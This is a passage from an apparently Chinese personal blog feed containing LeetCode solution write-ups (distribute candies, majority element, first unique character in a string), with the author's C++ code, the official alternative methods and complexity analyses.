<p>找到唯一元素数量的另一种方法是遍历给定 $candies$ 数组的所有元素，并继续将元素放入集合中。通过集合的属性，它将只包含唯一的元素。最后，我们可以计算集合中元素的数量，例如 $count$。要返回的值将再次由 $\text{min}(count, n/2)$ 给出，如前面的方法所述。其中 $n$ 表示 $candies$ 数组的大小。</p>
<p><strong>Java代码</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">distributeCandies</span><span class="params">(<span class="keyword">int</span>[] candies)</span> </span>&#123;</span><br><span class="line">        HashSet &lt; Integer &gt; set = <span class="keyword">new</span> HashSet &lt; &gt; ();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> candy: candies) &#123;</span><br><span class="line">            set.add(candy);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> Math.min(set.size(), candies.length / <span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li>时间复杂度：$O(n)$。整个 $candies$ 数组只遍历一次。这里，$n$ 表示 $candies$ 数组的大小。</li>
<li>空间复杂度：​在最坏的情况下，$set$ 的大小为 $n$。</li>
</ul>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>官方题解怎么整了这么多方法，但其实思路都是和我的差不多的，最后一种set集合实现比较高效，我用的unordered_map方法其实可以换成set容器，也并不算是计数法</p>
<p>，只用到了去重计数，这道题也简单，思路也比较好想。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>多数元素</title>
    <url>/2020/12/24/%E5%A4%9A%E6%95%B0%E5%85%83%E7%B4%A0/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/majority-element/submissions/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>给定一个大小为 n 的数组，找到其中的多数元素。多数元素是指在数组中出现次数<strong>大于</strong> <code>⌊ n/2 ⌋</code> 的元素。</p>
<p>你可以假设数组是非空的，并且给定的数组总是存在多数元素。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: [3,2,3]</span><br><span class="line">输出: 3</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: [2,2,1,1,1,2,2]</span><br><span class="line">输出: 2</span><br></pre></td></tr></table></figure>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>统计数组中的元素出现次数存储到map中，然后遍历map返回出现次数大于n/2的元素。</p>
<p><strong>c++代码：</strong>(执行用时28ms，击败55.10%，内存消耗9.1M，击败5.18%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">majorityElement</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">unordered_map</span>&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt; m;</span><br><span class="line">        <span class="keyword">int</span> n=nums.size()/<span class="number">2</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i:nums)&#123;</span><br><span class="line">            ++m[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> [j,k]:m)&#123;</span><br><span class="line">            <span class="keyword">if</span>(k&gt;n)&#123;</span><br><span class="line">                <span class="keyword">return</span> j;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎官 方 题 解💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎</center>

<h6 id="官方题解"><a href="#官方题解" class="headerlink" title="官方题解:"></a><a href="https://leetcode-cn.com/problems/majority-element/solution/duo-shu-yuan-su-by-leetcode-solution/">官方题解</a>:</h6><p><strong>说明</strong><br>本题题面中没有给出数据范围，但最简单的暴力方法（即枚举数组中的每个元素，再遍历一遍数组统计其出现次数，时间复杂度为 $O(N^2)$ 的算法）会超出时间限制，因此我们需要找出时间复杂度小于 $O(N^2)$的优秀做法。</p>
<p><strong>方法一：哈希表</strong><br><strong>思路</strong></p>
<p>我们知道出现次数最多的元素大于 $\lfloor \dfrac{n}{2} \rfloor$ 次，所以可以用哈希表来快速统计每个元素出现的次数。</p>
<p><strong>算法</strong></p>
<p>我们使用哈希映射（HashMap）来存储每个元素以及出现的次数。对于哈希映射中的每个键值对，键表示一个元素，值表示该元素出现的次数。</p>
<p>我们用一个循环遍历数组 nums 并将数组中的每个元素加入哈希映射中。在这之后，我们遍历哈希映射中的所有键值对，返回值最大的键。我们同样也可以在遍历数组 nums 时候使用打擂台的方法，维护最大的值，这样省去了最后对哈希映射的遍历。</p>
<p><strong>c++代码：</strong>(执行用时40ms，击败35.16%，内存消耗8.9M，击败61.00%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">majorityElement</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">unordered_map</span>&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt; counts;</span><br><span class="line">        <span class="keyword">int</span> majority = <span class="number">0</span>, cnt = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> num: nums) &#123;</span><br><span class="line">            ++counts[num];</span><br><span class="line">            <span class="keyword">if</span> (counts[num] &gt; cnt) &#123;</span><br><span class="line">                majority = num;</span><br><span class="line">                cnt = counts[num];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> majority;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li><p>时间复杂度：$O(n)$，其中 $n$ 是数组 nums 的长度。我们遍历数组 nums 一次，对于 nums 中的每一个元素，将其插入哈希表都只需要常数时间。如果在遍历时没有维护最大值，在遍历结束后还需要对哈希表进行遍历，因为哈希表中占用的空间为 $O(n)$（可参考下文的空间复杂度分析），那么遍历的时间不会超过 $O(n$)。因此总时间复杂度为 $O(n)$。</p>
</li>
<li><p>空间复杂度：$O(n)$。哈希表最多包含 $n - \lfloor \dfrac{n}{2} \rfloor$ 个键值对，所以占用的空间为 $O(n)$。这是因为任意一个长度为 $n$ 的数组最多只能包含 $n$ 个不同的值，但题中保证 nums 一定有一个众数，会占用（最少） $\lfloor \dfrac{n}{2} \rfloor + 1$个数字。因此最多有 $n - (\lfloor \dfrac{n}{2} \rfloor + 1)$个不同的其他数字，所以最多有 $n - \lfloor \dfrac{n}{2} \rfloor$个不同的元素。</p>
</li>
</ul>
<p><strong>方法二：排序</strong><br><strong>思路</strong></p>
<p>如果将数组 nums 中的所有元素按照单调递增或单调递减的顺序排序，那么下标为 $\lfloor \dfrac{n}{2} \rfloor$ 的元素（下标从 0 开始）一定是众数。</p>
<p><strong>算法</strong></p>
<p>对于这种算法，我们先将 nums 数组排序，然后返回上文所说的下标对应的元素。下面的图中解释了为什么这种策略是有效的。在下图中，第一个例子是 $n$ 为奇数的情况，第二个例子是 $n$ 为偶数的情况。</p>
<p><img src="https://pic.leetcode-cn.com/a70cb9316157ecd7eeffe7900d3ca83849079824964e8a0aaefbcffd4040f175-image.png" alt="image.png"></p>
<p>对于每种情况，数组下面的线表示如果众数是数组中的最小值时覆盖的下标，数组下面的线表示如果众数是数组中的最大值时覆盖的下标。对于其他的情况，这条线会在这两种极端情况的中间。对于这两种极端情况，它们会在下标为 $\lfloor \dfrac{n}{2} \rfloor$ 的地方有重叠。因此，无论众数是多少，返回 $\lfloor \dfrac{n}{2} \rfloor$ 下标对应的值都是正确的。</p>
<p><strong>c++代码：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">majorityElement</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        sort(nums.begin(), nums.end());</span><br><span class="line">        <span class="keyword">return</span> nums[nums.size() / <span class="number">2</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<p>时间复杂度：$O(n\log n)$。将数组排序的时间复杂度为 $O(n\log n)$。</p>
<p>空间复杂度：$O(\log n)$。如果使用语言自带的排序算法，需要使用 $O(\log n)$ 的栈空间。如果自己编写堆排序，则只需要使用 $O(1)$ 的额外空间。</p>
<p><strong>方法三：随机化</strong><br><strong>思路</strong></p>
<p>因为超过 $\lfloor \dfrac{n}{2} \rfloor$ 的数组下标被众数占据了，这样我们随机挑选一个下标对应的元素并验证，有很大的概率能找到众数。</p>
<p><strong>算法</strong></p>
<p>由于一个给定的下标对应的数字很有可能是众数，我们随机挑选一个下标，检查它是否是众数，如果是就返回，否则继续随机挑选。</p>
<p><strong>c++代码：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">majorityElement</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="keyword">int</span> candidate = nums[rand() % nums.size()];</span><br><span class="line">            <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> num : nums)</span><br><span class="line">                <span class="keyword">if</span> (num == candidate)</span><br><span class="line">                    ++count;</span><br><span class="line">            <span class="keyword">if</span> (count &gt; nums.size() / <span class="number">2</span>)</span><br><span class="line">                <span class="keyword">return</span> candidate;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li>时间复杂度：理论上最坏情况下的时间复杂度为 $O(\infty)$，因为如果我们的语气很差，这个算法会一直找不到众数，随机挑选无穷多次，所以最坏时间复杂度是没有上限的。然而，运行的期望时间是线性的。为了更简单地分析，先说服你自己：由于众数占据 超过 数组一半的位置，期望的随机次数会小于众数占据数组恰好一半的情况。因此，我们可以计算随机的期望次数（下标为 prob 为原问题，mod 为众数恰好占据数组一半数目的问题）：</li>
</ul>
<script type="math/tex; mode=display">
  \begin{aligned} E(\textit{iters}_{prob}) &\leq E(\textit{iters}_{mod}) \\ &= \lim_{n\to\infty} \sum_{i=1}^{n} i \cdot \frac{1}{2^i} \\ &= 2 \end{aligned}</script><p>  计算方法为：当众数恰好占据数组的一半时，第一次随机我们有 $\frac{1}{2}$ 的概率找到众数，如果没有找到，则第二次随机时，包含上一次我们有 $\frac{1}{4}$的概率找到众数，以此类推。因此期望的次数为 $i * \frac{1}{2^i}$的和，可以计算出这个和为 $2$，说明期望的随机次数是常数。每一次随机后，我们需要 $O(n)$的时间判断这个数是否为众数，因此期望的时间复杂度为 $O(n)$。</p>
<ul>
<li>空间复杂度：$O(1)$。随机方法只需要常数级别的额外空间。</li>
</ul>
<p><strong>方法四：分治</strong><br><strong>思路f</strong></p>
<p>如果数 a 是数组 nums 的众数，如果我们将 nums 分成两部分，那么 a 必定是至少一部分的众数。</p>
<p>我们可以使用反证法来证明这个结论。假设 a 既不是左半部分的众数，也不是右半部分的众数，那么 a 出现的次数少于 l / 2 + r / 2 次，其中 l 和 r 分别是左半部分和右半部分的长度。由于 l / 2 + r / 2 &lt;= (l + r) / 2，说明 a 也不是数组 nums 的众数，因此出现了矛盾。所以这个结论是正确的。</p>
<p>这样以来，我们就可以使用分治法解决这个问题：将数组分成左右两部分，分别求出左半部分的众数 a1 以及右半部分的众数 a2，随后在 a1 和 a2 中选出正确的众数。</p>
<p><strong>算法</strong></p>
<p>我们使用经典的分治算法递归求解，直到所有的子问题都是长度为 1 的数组。长度为 1 的子数组中唯一的数显然是众数，直接返回即可。如果回溯后某区间的长度大于 1，我们必须将左右子区间的值合并。如果它们的众数相同，那么显然这一段区间的众数是它们相同的值。否则，我们需要比较两个众数在整个区间内出现的次数来决定该区间的众数。</p>
<p><strong>c++代码：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">count_in_range</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> target, <span class="keyword">int</span> lo, <span class="keyword">int</span> hi)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = lo; i &lt;= hi; ++i)</span><br><span class="line">            <span class="keyword">if</span> (nums[i] == target)</span><br><span class="line">                ++count;</span><br><span class="line">        <span class="keyword">return</span> count;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">majority_element_rec</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> lo, <span class="keyword">int</span> hi)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (lo == hi)</span><br><span class="line">            <span class="keyword">return</span> nums[lo];</span><br><span class="line">        <span class="keyword">int</span> mid = (lo + hi) / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">int</span> left_majority = majority_element_rec(nums, lo, mid);</span><br><span class="line">        <span class="keyword">int</span> right_majority = majority_element_rec(nums, mid + <span class="number">1</span>, hi);</span><br><span class="line">        <span class="keyword">if</span> (count_in_range(nums, left_majority, lo, hi) &gt; (hi - lo + <span class="number">1</span>) / <span class="number">2</span>)</span><br><span class="line">            <span class="keyword">return</span> left_majority;</span><br><span class="line">        <span class="keyword">if</span> (count_in_range(nums, right_majority, lo, hi) &gt; (hi - lo + <span class="number">1</span>) / <span class="number">2</span>)</span><br><span class="line">            <span class="keyword">return</span> right_majority;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">majorityElement</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> majority_element_rec(nums, <span class="number">0</span>, nums.size() - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li>时间复杂度：$O(n\log n)$。函数 majority_element_rec() 会求解 2 个长度为 $\dfrac{n}{2}$ 的子问题，并做两遍长度为 $n$ 的线性扫描。因此，分治算法的时间复杂度可以表示为：</li>
</ul>
<script type="math/tex; mode=display">
  T(n) = 2T(\frac{n}{2}) + 2n​</script><p>  根据 主定理，本题满足第二种情况，所以时间复杂度可以表示为：</p>
<script type="math/tex; mode=display">
  \begin{aligned} T(n) &= \Theta(n^{log_{b}a}\log n) \\ &= \Theta(n^{log_{2}2}\log n) \\ &= \Theta(n \log n) \\ \end{aligned}</script><ul>
<li>空间复杂度：$O(\log n)$。尽管分治算法没有直接分配额外的数组空间，但在递归的过程中使用了额外的栈空间。算法每次将数组从中间分成两部分，所以数组长度变为 1 之前需要进行 $O(\log n)$次递归，即空间复杂度为 $O(\log n)$。</li>
</ul>
<p><strong>方法五：Boyer-Moore 投票算法</strong><br><strong>思路</strong></p>
<p>如果我们把众数记为 $+1$，把其他数记为 $-1$，将它们全部加起来，显然和大于 0，从结果本身我们可以看出众数比其他数多。</p>
<p><strong>算法</strong></p>
<p>Boyer-Moore 算法的本质和方法四中的分治十分类似。我们首先给出 Boyer-Moore 算法的详细步骤：</p>
<ul>
<li><p>我们维护一个候选众数 candidate 和它出现的次数 count。初始时 candidate 可以为任意值，count 为 0；</p>
</li>
<li><p>我们遍历数组 nums 中的所有元素，对于每个元素 x，在判断 x 之前，如果 count 的值为 0，我们先将 x 的值赋予 candidate，随后我们判断 x：</p>
<ul>
<li>如果 x 与 candidate 相等，那么计数器 count 的值增加 1；</li>
</ul>
</li>
</ul>
<ul>
<li>如果 x 与 candidate 不等，那么计数器 count 的值减少 1。</li>
</ul>
<ul>
<li>在遍历完成后，candidate 即为整个数组的众数。</li>
</ul>
<p><strong>c++代码：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">majorityElement</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> candidate = <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> num : nums) &#123;</span><br><span class="line">            <span class="keyword">if</span> (num == candidate)</span><br><span class="line">                ++count;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (--count &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                candidate = num;</span><br><span class="line">                count = <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> candidate;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li>时间复杂度：$O(n)$。Boyer-Moore 算法只对数组进行了一次遍历。</li>
<li>空间复杂度：$O(1)$。Boyer-Moore 算法只需要常数级别的额外空间。</li>
</ul>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>我giao你哥，官方题解给出5种解题方法，以后再补吧，罢了罢了想了想还是写完吧，拒绝拖延，从我做起🙄。</p>
<p>官方题解方法一哈希表和我的方法是一样的，不过其中认为遍历数组nums时维护最大值省去了对哈希映射的遍历这点我不敢苟同，因为这样做对数组nums中的每一个元素（相同的元素有多个也要遍历多次）都要进行if结构判断（遍历了n次），而遍历哈希映射最多只遍历不同元素个数（ $\frac{n}{2}-1$次），而且不需要维护最大值，只需要元素次数大于$\frac{n}{2}$就可以了。</p>
<p>第二种方法效率不行，后三种这么复杂不会真的有人用吧，最后一种还好些，更多的内容去官方题解找（我只复制了一部分）。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>字符串中的第一个唯一字符</title>
    <url>/2020/12/23/%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%AD%E7%9A%84%E7%AC%AC%E4%B8%80%E4%B8%AA%E5%94%AF%E4%B8%80%E5%AD%97%E7%AC%A6/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/first-unique-character-in-a-string/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>给定一个字符串，找到它的第一个不重复的字符，并返回它的索引。如果不存在，则返回 -1。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">s &#x3D; &quot;leetcode&quot;</span><br><span class="line">返回 0</span><br><span class="line"></span><br><span class="line">s &#x3D; &quot;loveleetcode&quot;</span><br><span class="line">返回 2</span><br></pre></td></tr></table></figure>
<p><strong>提示：</strong>你可以假定该字符串只包含小写字母。</p>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>计数法统计字符串s中不同字符的次数，然后遍历s，返回出现次数是1的字符的索引，不存在则返回-1。</p>
<p><strong>c++代码：</strong>(执行用时24ms，击败95.50%，内存消耗10.7M，击败62.96%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">firstUniqChar</span><span class="params">(<span class="built_in">string</span> s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> arr[<span class="number">26</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        <span class="keyword">int</span> len=s.length();</span><br><span class="line">        <span class="comment">//为字符串s中的字符计数</span></span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;len;++i)&#123;</span><br><span class="line">            ++arr[s[i]<span class="number">-97</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//查找不重复字符并返回索引</span></span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;len;++i)&#123;</span><br><span class="line">            <span class="keyword">if</span>(arr[s[i]<span class="number">-97</span>]==<span class="number">1</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎官 方 题 解💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎</center>

<h6 id="官方题解"><a href="#官方题解" class="headerlink" title="官方题解:"></a><a href="https://leetcode-cn.com/problems/first-unique-character-in-a-string/solution/zi-fu-chuan-zhong-de-di-yi-ge-wei-yi-zi-x9rok/">官方题解</a>:</h6><p><strong>方法一：使用哈希表存储频数</strong><br><strong>思路与算法</strong></p>
<p>我们可以对字符串进行两次遍历。</p>
<p>在第一次遍历时，我们使用哈希映射统计出字符串中每个字符出现的次数。在第二次遍历时，我们只要遍历到了一个只出现一次的字符，那么就返回它的索引，否则在遍历结束后返回 −1。</p>
<p><strong>c++代码：</strong>(执行用时100ms，击败53.87%，内存消耗10.9M，击败22.16%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">firstUniqChar</span><span class="params">(<span class="built_in">string</span> s)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">unordered_map</span>&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt; frequency;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">char</span> ch: s) &#123;</span><br><span class="line">            ++frequency[ch];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; s.size(); ++i) &#123;</span><br><span class="line">            <span class="keyword">if</span> (frequency[s[i]] == <span class="number">1</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li><p>时间复杂度：$O(n)$，其中 $n$ 是字符串 $s$ 的长度。我们需要进行两次遍历。</p>
</li>
<li><p>空间复杂度：$O(|\Sigma|)$，其中 $\Sigma$ 是字符集，在本题中 $s$ 只包含小写字母，因此 $|\Sigma| \leq 26$。我们需要 $O(|\Sigma|)$ 的空间存储哈希映射。</p>
</li>
</ul>
<p><strong>方法二：使用哈希表存储索引</strong></p>
<p><strong>思路与算法</strong></p>
<p>我们可以对方法一进行修改，使得第二次遍历的对象从字符串变为哈希映射。</p>
<p>具体地，对于哈希映射中的每一个键值对，键表示一个字符，值表示它的首次出现的索引（如果该字符只出现一次）或者 -1（如果该字符出现多次）。当我们第一次遍历字符串时，设当前遍历到的字符为 c，如果 c 不在哈希映射中，我们就将 c 与它的索引作为一个键值对加入哈希映射中，否则我们将 c 在哈希映射中对应的值修改为 -1。</p>
<p>在第一次遍历结束后，我们只需要再遍历一次哈希映射中的所有值，找出其中不为 -1 的最小值，即为第一个不重复字符的索引。如果哈希映射中的所有值均为 -1，我们就返回 -1。</p>
<p><strong>c++代码：</strong>(执行用时176ms，击败20.24%，内存消耗10.9M，击败19.62%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">firstUniqChar</span><span class="params">(<span class="built_in">string</span> s)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">unordered_map</span>&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt; position;</span><br><span class="line">        <span class="keyword">int</span> n = s.size();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line">            <span class="keyword">if</span> (position.count(s[i])) &#123;</span><br><span class="line">                position[s[i]] = <span class="number">-1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                position[s[i]] = i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> first = n;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> [_, pos]: position) &#123;</span><br><span class="line">            <span class="keyword">if</span> (pos != <span class="number">-1</span> &amp;&amp; pos &lt; first) &#123;</span><br><span class="line">                first = pos;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (first == n) &#123;</span><br><span class="line">            first = <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> first;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
